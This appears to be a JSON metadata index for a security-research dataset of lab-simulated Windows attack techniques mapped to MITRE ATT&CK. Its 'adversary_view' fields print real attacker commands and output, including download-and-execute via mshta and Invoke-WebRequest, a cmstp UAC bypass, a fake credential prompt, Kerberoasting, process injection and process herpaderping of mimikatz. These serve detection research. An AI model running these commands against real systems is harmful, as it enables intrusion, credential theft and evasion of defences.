                    "module": "powershell",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md#atomic-test-2---powershell---prompt-user-for-password"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "PS > $cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\nPS > write-warning $cred.GetNetworkCredential().Password\nWARNING: testing\nPS >"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md#atomic-test-2---powershell---prompt-user-for-password",
            "https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-creduipromptforcredentialsa"
        ],
        "mp_last_updated": "2022-01-08T01:49:51.406375+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201021001911.yaml": {
        "title": "Netsh Open FW Proxy Ports",
        "id": "SDWIN-201021001911",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/21",
        "modification_date": "2020/10/21",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.15e57006-79dd-46df-9bf9-31bc24fb5a80"
        ],
        "description": "This dataset represents adversaries modifying the local FW by opening port for proxy.",
        "attack_mappings": [
            {
                "technique": "T1562",
                "sub-technique": "004",
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_netsh_fw_mod_open_ports.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "cmd",
                    "module": "cmd",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-4---opening-ports-for-proxy---hardrain"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow dir=in protocol=TCP localport=450\nnetsh advfirewall firewall delete rule name=\"atomic testing\" protocol=TCP localport=450 >nul 2>&1"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-4---opening-ports-for-proxy---hardrain"
        ],
        "mp_last_updated": "2022-01-08T01:49:51.610377+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201021204544.yaml": {
        "title": "Service Modification Fax",
        "id": "SDWIN-201021204544",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/21",
        "modification_date": "2020/10/21",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.ed366cde-7d12-49df-a833-671904770b9f"
        ],
        "description": "This dataset represents adversaries modifying a local service to execute powershell.",
        "attack_mappings": [
            {
                "technique": "T1543",
                "sub-technique": "003",
                "tactics": [
                    "TA0003",
                    "TA0004"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/privilege_escalation/host/cmd_service_mod_fax.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "cmd",
                    "module": "cmd",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md#atomic-test-1---modify-fax-service-to-run-powershell"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\"\nsc start Fax"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md#atomic-test-1---modify-fax-service-to-run-powershell"
        ],
        "mp_last_updated": "2022-01-08T01:49:51.815376+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201021232814.yaml": {
        "title": "Internet Explorer Version Discovery",
        "id": "SDWIN-201021232814",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/21",
        "modification_date": "2020/10/21",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.68981660-6670-47ee-a5fa-7e74806420a4"
        ],
        "description": "This dataset represents threat actors querying HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer to get the version of internet explorer installed on the system.",
        "attack_mappings": [
            {
                "technique": "T1518",
                "sub-technique": null,
                "tactics": [
                    "TA0007"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/host/cmd_discover_iexplorer_version_registry.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "cmd",
                    "module": "cmd",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518/T1518.md#atomic-test-1---find-and-display-internet-explorer-browser-version"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518/T1518.md#atomic-test-1---find-and-display-internet-explorer-browser-version"
        ],
        "mp_last_updated": "2022-01-08T01:49:52.021376+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201022002145.yaml": {
        "title": "HH Execution of Local Compiled HTML Payload",
        "id": "SDWIN-201022002145",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/22",
        "modification_date": "2020/10/22",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.5cb87818-0d7c-4469-b7ef-9224107aebe8"
        ],
        "description": "This dataset represents threat actors executing local compiled HTML Help payloads via hh.exe.",
        "attack_mappings": [
            {
                "technique": "T1218",
                "sub-technique": "001",
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_hh_local_html_payload.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "powershell",
                    "module": "powershell",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md#atomic-test-1---compiled-html-help-local-payload"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm\" -OutFile C:\\ProgramData\\T1218.001.chm\nhh.exe C:\\ProgramData\\T1218.001.chm"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md#atomic-test-1---compiled-html-help-local-payload"
        ],
        "mp_last_updated": "2022-01-08T01:49:52.209375+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201022013121.yaml": {
        "title": "Control Panel Execution",
        "id": "SDWIN-201022013121",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/22",
        "modification_date": "2020/10/22",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.037e9d8a-9e46-4255-8b33-2ae3b545ca6f"
        ],
        "description": "This dataset represents threat actors leveraging control.exe to execute a .cpl file to proxy execute another payload (i.e. calc).",
        "attack_mappings": [
            {
                "technique": "T1218",
                "sub-technique": "002",
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_control_panel_execution.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "powershell",
                    "module": "powershell",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.002/T1218.002.md#atomic-test-1---control-panel-items"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.002/bin/calc.cpl\" -OutFile C:\\ProgramData\\calc.cpl\ncontrol.exe C:\\ProgramData\\calc.cpl"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.002/T1218.002.md#atomic-test-1---control-panel-items"
        ],
        "mp_last_updated": "2022-01-08T01:49:52.398375+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201022015432.yaml": {
        "title": "CMSTP Proxy Execution",
        "id": "SDWIN-201022015432",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/22",
        "modification_date": "2020/10/22",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.748cb4f6-2fb3-4e97-b7ad-b22635a09ab0"
        ],
        "description": "This dataset represents threat actors leveraging CMSTP to execute an Inf file to proxy execute other malicious commands (i.e. cmd.exe). (Embedding commands in the RunPreSetupCommandsSection of the INF file).",
        "attack_mappings": [
            {
                "technique": "T1218",
                "sub-technique": "003",
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_cmstp_execution_bypassuac.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "powershell",
                    "module": "powershell",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md#atomic-test-2---cmstp-executing-uac-bypass"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf\" -OutFile C:\\ProgramData\\T1218.003_uacbypass.inf\ncmstp.exe /s C:\\ProgramData\\T1218.003_uacbypass.inf /au"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md#atomic-test-2---cmstp-executing-uac-bypass"
        ],
        "mp_last_updated": "2022-01-08T01:49:52.597375+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201022022144.yaml": {
        "title": "Mshta Javascript GetObject Sct",
        "id": "SDWIN-201022022144",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/22",
        "modification_date": "2020/10/22",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.1483fab9-4f52-4217-a9ce-daa9d7747cae"
        ],
        "description": "This dataset represents threat actors leveraging mshta.exe to proxy execute malicious .sct files via Javascript.",
        "attack_mappings": [
            {
                "technique": "T1218",
                "sub-technique": "005",
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_mshta_javascript_getobject_sct.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md#atomic-test-1---mshta-executes-javascript-scheme-fetch-remote-payload-with-getobject"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md#atomic-test-1---mshta-executes-javascript-scheme-fetch-remote-payload-with-getobject"
        ],
        "mp_last_updated": "2022-01-08T01:49:56.431604+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201022025808.yaml": {
        "title": "Mshta VBScript Execute PowerShell",
        "id": "SDWIN-201022025808",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/22",
        "modification_date": "2020/10/22",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.906865c3-e05f-4acc-85c4-fbc185455095"
        ],
        "description": "This dataset represents threat actors leveraging mshta.exe to proxy execute malicious powershell commands via vbscript.",
        "attack_mappings": [
            {
                "technique": "T1218",
                "sub-technique": "005",
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_mshta_vbscript_execute_psh.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md#atomic-test-2---mshta-executes-vbscript-to-execute-malicious-command"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -command Get-Service sysmon\"\":close\")"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md#atomic-test-2---mshta-executes-vbscript-to-execute-malicious-command"
        ],
        "mp_last_updated": "2022-01-08T01:49:56.671949+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201022035214.yaml": {
        "title": "Mshta HTML Application (HTA) Execution",
        "id": "SDWIN-201022035214",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/22",
        "modification_date": "2020/10/22",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.c4b97eeb-5249-4455-a607-59f95485cb45"
        ],
        "description": "This dataset represents threat actors leveraging mshta.exe to proxy execute malicious commands via an .hta file.",
        "attack_mappings": [
            {
                "technique": "T1218",
                "sub-technique": "005",
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_mshta_html_application_execution.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "PowerShell",
                    "module": "PowerShell",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md#atomic-test-3---mshta-executes-remote-html-application-hta"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\"\n$var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"\nmshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\""
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md#atomic-test-3---mshta-executes-remote-html-application-hta"
        ],
        "mp_last_updated": "2022-01-08T01:49:56.857604+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201022042947.yaml": {
        "title": "PurpleSharp Active Directory Playbook I",
        "id": "SDWIN-201022042947",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g",
            "Mauricio Velazco @mvelazco"
        ],
        "creation_date": "2020/10/22",
        "modification_date": "2020/10/22",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents threat actors performing a few techniques in Active Directory to brute force passwords, request Kerberos ticket-granting service (TGS) service tickets from all SPNs, test access to remote network shares, and move laterally over Windows Remote Management (WinRM).",
        "attack_mappings": [
            {
                "technique": "T1110",
                "sub-technique": "003",
                "tactics": [
                    "TA0006"
                ]
            },
            {
                "technique": "T1558",
                "sub-technique": "003",
                "tactics": [
                    "TA0006"
                ]
            },
            {
                "technique": "T1135",
                "sub-technique": null,
                "tactics": [
                    "TA0007"
                ]
            },
            {
                "technique": "T1021",
                "sub-technique": "006",
                "tactics": [
                    "TA0008"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/purplesharp_ad_playbook_I.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/purplesharp_ad_playbook_I.zip"
            }
        ],
        "simulation": {
            "environment": "Shire",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": "https://github.com/mvelazc0/PurpleSharp"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "c:\\Users\\pgustavo\\Downloads>PurpleSharp.exe /t T1110.003,T1558.003,T1135,T1021.006\n10/22/2020 04:29:52 [*]  Starting T1110.003 Simulation on WORKSTATION5\n10/22/2020 04:29:52 [*]  Simulator running from c:\\Users\\pgustavo\\Downloads\\PurpleSharp.exe with PID:7520 as THESHIRE\\pgustavo\n10/22/2020 04:29:52 [*]  Local Domain Brute Force using the LogonUser Win32 API function\n[*] Targeting domain neighbor users\n[*] Using LogonServer MORDORDC.theshire.local for LDAP queries\n[*] Querying for active domain users with badPwdCount <= 3..\n10/22/2020 04:29:53 [*]  Obtained 7 user accounts\n10/22/2020 04:29:53 [*]  Tried to authenticate as lrodriguez (NTLM). Error Code:1326\n10/22/2020 04:29:53 [*]  Tried to authenticate as pgustavo (NTLM). Error Code:1326\n10/22/2020 04:29:53 [*]  Tried to authenticate as sysmonsvc (NTLM). Error Code:1326\n10/22/2020 04:29:53 [*]  Tried to authenticate as sbeavers (NTLM). Error Code:1326\n10/22/2020 04:29:53 [*]  Tried to authenticate as mscott (NTLM). Error Code:1326\n10/22/2020 04:29:53 [*]  Tried to authenticate as pbeesly (NTLM). Error Code:1326\n10/22/2020 04:29:53 [*]  Tried to authenticate as nxlogsvc (NTLM). Error Code:1326\n10/22/2020 04:29:53 [*]  Simulation Finished\n10/22/2020 04:29:53 [*]  Starting T1558.003 Simulation on WORKSTATION5\n10/22/2020 04:29:53 [*]  Simulator running from c:\\Users\\pgustavo\\Downloads\\PurpleSharp.exe with PID:7520 as THESHIRE\\pgustavo\n10/22/2020 04:29:54 [*]  Obtained service ticket and hash for SPN Sysmon/theshire.local (sysmonsvc)\n10/22/2020 04:29:54 [*]  Obtained service ticket and hash for SPN Nxlog/theshire.local (nxlogsvc)\n10/22/2020 04:29:54 [*]  Obtained service ticket and hash for SPN Defense/theshire.local (defensesvc)\n10/22/2020 04:29:54 [*]  Obtained service ticket and hash for SPN OTR/theshire.local (otrsvc)\n10/22/2020 04:29:54 [*]  Obtained service ticket and hash for SPN Ring/theshire.local (mordorsvc)\n10/22/2020 04:29:54 [*]  Simulation Finished\n10/22/2020 04:29:54 [*]  Starting T1135 Simulation on WORKSTATION5\n10/22/2020 04:29:54 [*]  Simulator running from c:\\Users\\pgustavo\\Downloads\\PurpleSharp.exe with PID:7520 as THESHIRE\\pgustavo\n10/22/2020 04:29:54 [*]  Using the Win32 API NetShareEnum function to execute this technique\n[*] Obtaining domain neighbor targets ...\n[*] Using MORDORDC.theshire.local for LDAP queries\n10/22/2020 04:29:54 [*]  Obtained 4 target computers\n10/22/2020 04:29:54 [*]  Successfully enumerated shares on WEC.theshire.local as THESHIRE\\pgustavo\n10/22/2020 04:29:54 [*]  Successfully enumerated shares on WORKSTATION6.theshire.local as THESHIRE\\pgustavo\n10/22/2020 04:29:54 [*]  Successfully enumerated shares on MORDORDC.theshire.local as THESHIRE\\pgustavo\n10/22/2020 04:29:54 [*]  Successfully enumerated shares on WORKSTATION7.theshire.local as THESHIRE\\pgustavo\n10/22/2020 04:29:54 [*]  Simulation Finished\n10/22/2020 04:29:54 [*]  Starting T1021.006 Simulation on WORKSTATION5\n10/22/2020 04:29:54 [*]  Simulator running from c:\\Users\\pgustavo\\Downloads\\PurpleSharp.exe with PID:7520 as THESHIRE\\pgustavo\n10/22/2020 04:29:54 [*]  Using the System.Management.Automation .NET namespace to execute this technique\n10/22/2020 04:29:54 [*]  Querying LDAP for random targets...\n[*] Obtaining domain neighbor targets ...\n[*] Using MORDORDC.theshire.local for LDAP queries\n10/22/2020 04:29:54 [*]  Obtained 4 target computers\n10/22/2020 04:29:59 [*]  Started a process using WinRM on WORKSTATION7\n10/22/2020 04:30:00 [*]  Started a process using WinRM on WEC\n10/22/2020 04:30:00 [*]  Started a process using WinRM on WORKSTATION6\n10/22/2020 04:30:01 [*]  Started a process using WinRM on MORDORDC\n10/22/2020 04:30:01 [*]  Simulation Finished\n10/22/2020 04:30:01 [*]  Playbook Finished\n\nc:\\Users\\pgustavo\\Downloads>"
        },
        "references": [
            "https://github.com/mvelazc0/PurpleSharp"
        ],
        "mp_last_updated": "2022-01-08T01:49:57.051288+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201023020513.yaml": {
        "title": "Register-CimProvider Execute Dll",
        "id": "SDWIN-201023020513",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/23",
        "modification_date": "2020/10/23",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents threat actors leveraging Register-Cimprovider to execute a malicious Dll.",
        "attack_mappings": [
            {
                "technique": "T1218",
                "sub-technique": null,
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_register_cimprovider_execute_dll.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "PowerShell",
                    "module": "PowerShell",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md#atomic-test-3---register-cimprovider---execute-evil-dll"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "PS >Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile C:\\ProgramData\\T1218-2.dll\nPS > C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path C:\\ProgramData\\T1218-2.dll\n\n'Namespace' is not specified.\n'ProviderName' is not specified.\nFailed to load provider 'C:\\ProgramData\\T1218-2.dll'. Failure code 0x8007045A.\n\nTry 'Register-CimProvider.exe -help' for help."
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md#atomic-test-3---register-cimprovider---execute-evil-dll"
        ],
        "mp_last_updated": "2022-01-08T01:49:59.465652+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201023023651.yaml": {
        "title": "Bitsadmin Download Malicious File",
        "id": "SDWIN-201023023651",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/23",
        "modification_date": "2020/10/23",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "art.3c73d728-75fb-4180-a12f-6712864d7421"
        ],
        "description": "This dataset represents threat actors leveraging bitsadmin.exe to download a file.",
        "attack_mappings": [
            {
                "technique": "T1197",
                "sub-technique": null,
                "tactics": [
                    "TA0003",
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_bitsadmin_download_psh_script.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md#atomic-test-1---bitsadmin-download-cmd"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin1_flag.ps1\n\nDISPLAY: '/Download' TYPE: DOWNLOAD STATE: TRANSFERRED\nPRIORITY: FOREGROUND FILES: 1 / 1 BYTES: 6886 / 6886 (100%)\nTransfer complete."
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md#atomic-test-1---bitsadmin-download-cmd"
        ],
        "mp_last_updated": "2022-01-08T01:49:59.703461+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201023031210.yaml": {
        "title": "PurpleSharp PE Injection CreateRemoteThread",
        "id": "SDWIN-201023031210",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/23",
        "modification_date": "2020/10/23",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents threat actors injecting portable executables (PE) into processes via APIs such asVirtualAllocEx and WriteProcessMemory and running it on the virtual address space of another process via the CreateRemoteThread API.",
        "attack_mappings": [
            {
                "technique": "T1055",
                "sub-technique": "002",
                "tactics": [
                    "TA0004",
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/purplesharp_pe_injection_createremotethread.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": "https://github.com/mvelazc0/PurpleSharp/blob/master/PurpleSharp/Simulations/DefenseEvasion.cs#L216-L238"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "C:\\Users\\wardog\\Desktop>PurpleSharp.exe /t T1055.002\n10/23/2020 03:12:04 [*]  Starting T1055.002 Simulation on WORKSTATION5\n10/23/2020 03:12:04 [*]  Simulator running from C:\\Users\\wardog\\Desktop\\PurpleSharp.exe with PID:8972 as WORKSTATION5\\wardog\n10/23/2020 03:12:04 [*]  Process notepad.exe with PID:9908 started for the injection\n10/23/2020 03:12:04 [*]  Calling OpenProcess on PID:9908\n10/23/2020 03:12:04 [*]  Calling VirtualAllocEx on PID:9908\n10/23/2020 03:12:04 [*]  Calling WriteProcessMemory on PID:9908\n10/23/2020 03:12:04 [*]  Calling CreateRemoteThread on PID:9908\n10/23/2020 03:12:04 [*]  Simulation Finished\n10/23/2020 03:12:04 [*]  Playbook Finished\n\nC:\\Users\\wardog\\Desktop>"
        },
        "references": [
            "https://github.com/mvelazc0/PurpleSharp/blob/master/PurpleSharp/Simulations/DefenseEvasion.cs#L216-L238"
        ],
        "mp_last_updated": "2022-01-08T01:49:59.909107+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201026235835.yaml": {
        "title": "Process Herpaderping Mimikatz",
        "id": "SDWIN-201026235835",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/26",
        "modification_date": "2020/10/26",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents the execution of a Process Herpaderping to obscure the intentions of a process by modifying the content on disk after the image has been mapped.",
        "attack_mappings": [
            {
                "technique": "T1055",
                "sub-technique": null,
                "tactics": [
                    "TA0004",
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_process_herpaderping_snippingtool.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": "https://github.com/jxy-s/herpaderping"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "C:\\Users\\wardog>cd Desktop\n\nC:\\Users\\wardog\\Desktop>ProcessHerpaderping.exe mimikatz.exe wardog.exe C:\\Windows\\system32\\SnippingTool.exe\nProcess Herpaderping Tool - Copyright (c) 2020 Johnny Shaw\n[12140:10252][OK]    Source File: \"mimikatz.exe\"\n[12140:10252][OK]    Target File: \"wardog.exe\"\n[12140:10252][INFO]  Copied source binary to target file\n[12140:10252][INFO]  Created image section for target\n[12140:10252][INFO]  Created process object, PID 8924\n[12140:10252][INFO]  Located target image entry RVA 0x000c3aec\n[12140:10252][OK]    Replacing target with \"C:\\Windows\\system32\\SnippingTool.exe\"\n[12140:10252][OK]    Preparing target for execution\n[12140:10252][INFO]  Writing process parameters, remote PEB ProcessParameters 0x0000000000AED020\n[12140:10252][INFO]  Creating thread in process at entry point 0x00007FF733E63AEC\n[12140:10252][INFO]  Created thread, TID 12112\n[12140:10252][OK]    Waiting for herpaderped process to exit\n[12140:10252][OK]    Herpaderped process exited with code 0xc000013a\n[12140:10252][OK]    Process Herpaderp Succeeded\n\nC:\\Users\\wardog\\Desktop>"
        },
        "references": [
            "https://github.com/jxy-s/herpaderping",
            "https://twitter.com/jxy__s/status/1320853852153769984"
        ],
        "mp_last_updated": "2022-01-08T01:50:00.090140+00:00"
    },
